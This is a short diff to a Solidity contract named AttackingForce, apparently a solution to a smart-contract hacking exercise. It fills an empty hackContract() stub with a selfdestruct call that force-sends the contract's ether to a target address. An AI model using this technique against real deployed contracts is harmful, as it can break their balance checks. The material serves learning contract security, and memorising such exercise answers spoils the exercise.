@@ -11,5 +11,7 @@ contract AttackingForce {
 
     function hackContract() external {
         // Code me!
+        address payable a = payable(contractAddress);
+        selfdestruct(a);
     }
 }
